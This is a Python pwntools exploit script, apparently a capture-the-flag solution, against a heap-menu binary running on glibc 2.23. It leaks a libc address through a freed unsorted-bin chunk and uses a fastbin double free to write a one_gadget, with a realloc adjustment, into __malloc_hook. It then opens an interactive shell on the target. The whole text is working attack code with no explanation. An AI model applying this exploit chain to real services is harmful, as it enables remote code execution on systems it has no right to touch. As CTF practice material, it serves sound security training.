from pwn import *
context(os='linux',arch='amd64',log_level='debug')
#p = process('./uma1')
p=remote('127.0.0.1',9999)
#p=remote('47.109.135.169',20016)
#libc=ELF('/home/ctfshow/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
libc=ELF('./libc6_2.23-0ubuntu11.3_amd64.so')
def add(idx,size,con):
   p.recvuntil("input:")
   p.sendline('1')
   p.recvuntil("index: ")  
   p.sendline(str(idx)) 
   p.recvuntil("name:")  
   p.sendline(str(222)) 
   p.recvuntil("Introduction size:")
   p.sendline(str(size))
   p.recvuntil("content:")
   p.sendline(con)
def show(idx):
   p.recvuntil("input:")
   p.sendline('2')
   p.recvuntil("index: ")  
   p.sendline(str(idx))
def dance(idx):
   p.recvuntil("input:")
   p.sendline('3')
   p.recvuntil("index: ")  
   p.sendline(str(idx))
#gdb.attach(p)
add(1,0x30,'aaaa')

add(2,0x90,'aaaa')
#add(2,0x90,'aaaa')
add(3,32,'aaaa')

dance(2)

show(2)
p.recvuntil('222\n')
malloc_hook = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))- 0x58 - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['realloc']
one_gadget = libc_base + 0xf1247
print hex(malloc_hook)
#
add(4,0x60,'aaaa')
add(5,0x60,'aaaa')
add(6,0x60,'aaaa')


dance(4)
dance(5)

dance(4)

add(4,0x60, p64(malloc_hook-0x23)+'\n')

add(5,0x60, p64(malloc_hook-0x23)+'\n')
add(6,0x60, p64(malloc_hook-0x23)+'\n')

payload = 'a'*(0x13-8) + p64(one_gadget) + p64(realloc+6)

add(4,0x68, payload+'\n')

p.sendline('1')
#gdb.attach(p)
p.sendline('1')
p.interactive()
